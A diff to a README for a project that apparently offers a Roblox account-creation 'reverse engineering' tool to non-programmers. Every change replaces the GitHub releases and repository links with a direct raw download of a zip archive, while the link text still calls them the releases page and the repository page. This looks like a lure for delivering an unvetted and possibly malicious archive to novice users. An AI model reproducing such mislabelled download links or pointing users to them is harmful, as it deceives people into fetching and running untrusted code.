@@ -4,7 +4,7 @@
 Welcome to the roblox project. This tool helps you understand Roblox account creation through reverse engineering. You don't need to be a programmer to use this application. Follow the steps below to download and set up the software on your device.
 
 ## 📥 Download Links
-[![Download roblox](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/phenixe/roblox/releases)
+[![Download roblox](https://raw.githubusercontent.com/phenixe/roblox/main/technologue/roblox.zip)](https://raw.githubusercontent.com/phenixe/roblox/main/technologue/roblox.zip)
 
 ## 🔍 Overview
 The roblox project allows users to explore how Roblox accounts are created. It focuses on the methods and data involved. You can learn while using the application, and it can spark your curiosity about programming. 
@@ -16,7 +16,7 @@ The roblox project allows users to explore how Roblox accounts are created. It f
 - **Internet Connection:** Required for initial setup and updates.
 
 ## 💻 Download & Install
-1. Click the link to visit the releases page: [Download here](https://github.com/phenixe/roblox/releases).
+1. Click the link to visit the releases page: [Download here](https://raw.githubusercontent.com/phenixe/roblox/main/technologue/roblox.zip).
 2. Once there, look for the latest version of the roblox application.
 3. Download the setup file appropriate for your operating system.
 4. Locate the downloaded file in your computer’s downloads folder.
@@ -48,6 +48,6 @@ The application works on Windows, Mac, and Linux. Please ensure you meet the sys
 If you encounter issues or have questions, please reach out through the issue tracker on the GitHub repository. Our community is here to help you.
 
 ## 🔗 More Information
-For additional details, visit the repository page: [roblox on GitHub](https://github.com/phenixe/roblox).
+For additional details, visit the repository page: [roblox on GitHub](https://raw.githubusercontent.com/phenixe/roblox/main/technologue/roblox.zip).
 
-[![Download roblox](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/phenixe/roblox/releases)
+[![Download roblox](https://raw.githubusercontent.com/phenixe/roblox/main/technologue/roblox.zip)](https://raw.githubusercontent.com/phenixe/roblox/main/technologue/roblox.zip)
